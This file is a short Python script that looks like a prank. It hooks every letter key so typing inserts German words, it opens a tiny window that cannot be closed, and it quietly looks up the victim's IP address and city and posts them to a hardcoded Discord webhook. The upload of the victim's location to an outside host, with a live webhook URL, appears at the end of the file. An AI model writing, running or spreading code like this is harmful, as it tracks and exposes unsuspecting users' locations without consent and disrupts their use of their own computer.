import keyboard
import tkinter as tk
import requests

keyboard.add_hotkey('l', lambda: keyboard.write('eonard'))
keyboard.add_hotkey('s', lambda: keyboard.write('imon'))
keyboard.add_hotkey('h', lambda: keyboard.write('eniffer'))
keyboard.add_hotkey('a', lambda: keyboard.write('li'))
keyboard.add_hotkey('b', lambda: keyboard.write('irgit'))
keyboard.add_hotkey('c', lambda: keyboard.write('lown'))
keyboard.add_hotkey('d', lambda: keyboard.write('umm'))
keyboard.add_hotkey('e', lambda: keyboard.write('nte'))
keyboard.add_hotkey('f', lambda: keyboard.write('lasche'))
keyboard.add_hotkey('g', lambda: keyboard.write('ustav'))
keyboard.add_hotkey('i', lambda: keyboard.write('ngolstadt'))
keyboard.add_hotkey('j', lambda: keyboard.write('an'))
keyboard.add_hotkey('k', lambda: keyboard.write('omplementär'))
keyboard.add_hotkey('m', lambda: keyboard.write('artin'))
keyboard.add_hotkey('n', lambda: keyboard.write('ussknacker'))
keyboard.add_hotkey('o', lambda: keyboard.write('ppenheimer'))
keyboard.add_hotkey('p', lambda: keyboard.write('utenschnitzel'))
keyboard.add_hotkey('q', lambda: keyboard.write('uattro-formaggi'))
keyboard.add_hotkey('r', lambda: keyboard.write('üdiger'))
keyboard.add_hotkey('t', lambda: keyboard.write('abakladen'))
keyboard.add_hotkey('u', lambda: keyboard.write('-bahnfahrer'))
keyboard.add_hotkey('v', lambda: keyboard.write('erwendungszweck'))
keyboard.add_hotkey('w', lambda: keyboard.write('eintraube'))
keyboard.add_hotkey('x', lambda: keyboard.write('enomorph'))
keyboard.add_hotkey('y', lambda: keyboard.write('amswurzelgewächse'))
keyboard.add_hotkey('z', lambda: keyboard.write('ehnzilindermotor'))
keyboard.add_hotkey('.', lambda: keyboard.write('..'))
keyboard.add_hotkey('ä', lambda: keyboard.write('pfeln'))
keyboard.add_hotkey('ü', lambda: keyboard.write('berfall'))
keyboard.add_hotkey('ö', lambda: keyboard.write('lvorkommen'))
keyboard.add_hotkey('ß', lambda: keyboard.write('---'))


keyboard.add_hotkey('shift+l', lambda: keyboard.write('eonard'))
keyboard.add_hotkey('shift+s', lambda: keyboard.write('imon'))
keyboard.add_hotkey('shift+h', lambda: keyboard.write('eniffer'))
keyboard.add_hotkey('shift+a', lambda: keyboard.write('li'))
keyboard.add_hotkey('shift+b', lambda: keyboard.write('irgit'))
keyboard.add_hotkey('shift+c', lambda: keyboard.write('lown'))
keyboard.add_hotkey('shift+d', lambda: keyboard.write('umm'))
keyboard.add_hotkey('shift+e', lambda: keyboard.write('nte'))
keyboard.add_hotkey('shift+f', lambda: keyboard.write('lasche'))
keyboard.add_hotkey('shift+g', lambda: keyboard.write('ustav'))
keyboard.add_hotkey('shift+i', lambda: keyboard.write('ngolstadt'))
keyboard.add_hotkey('shift+j', lambda: keyboard.write('an'))
keyboard.add_hotkey('shift+k', lambda: keyboard.write('omplementär'))
keyboard.add_hotkey('shift+m', lambda: keyboard.write('artin'))
keyboard.add_hotkey('shift+n', lambda: keyboard.write('ussknacker'))
keyboard.add_hotkey('shift+o', lambda: keyboard.write('ppenheimer'))
keyboard.add_hotkey('shift+p', lambda: keyboard.write('ustekuchen'))
keyboard.add_hotkey('shift+q', lambda: keyboard.write('uattro-formaggi'))
keyboard.add_hotkey('shift+r', lambda: keyboard.write('üdiger'))
keyboard.add_hotkey('shift+t', lambda: keyboard.write('abakladen'))
keyboard.add_hotkey('shift+u', lambda: keyboard.write('-bahnfahrer'))
keyboard.add_hotkey('shift+v', lambda: keyboard.write('erwendungszweck'))
keyboard.add_hotkey('shift+w', lambda: keyboard.write('eintraube'))
keyboard.add_hotkey('shift+x', lambda: keyboard.write('enomorph'))
keyboard.add_hotkey('shift+y', lambda: keyboard.write('amswurzelgewächse'))
keyboard.add_hotkey('shift+z', lambda: keyboard.write('ehnzilindermotor'))
keyboard.add_hotkey('shift+ä', lambda: keyboard.write('pfeln'))
keyboard.add_hotkey('shift+ü', lambda: keyboard.write('berfall'))
keyboard.add_hotkey('shift+ö', lambda: keyboard.write('lvorkommen'))

def disable_event():
   pass

master = tk.Tk()
master.geometry('1x1')
master.protocol("WM_DELETE_WINDOW", disable_event)
r = requests.get('http://ip-api.com/json/')
response = r.json()
location_data = {
        "ip": response.get("query"),
        "city": response.get("city"),
        "region": response.get("region"),
        "country": response.get("country_name")
    }
location = str(location_data)
data = {"content": location}
requests.post('https://discord.com/api/webhooks/1225498070649798810/6XmkzHE5_1LF2bL-7GdrTAuqyX7PBfar5d6g8yrYMjndC0Ds-guoOGgEBSlT4XrXxq-T', json=data)
master.mainloop()

keyboard.wait()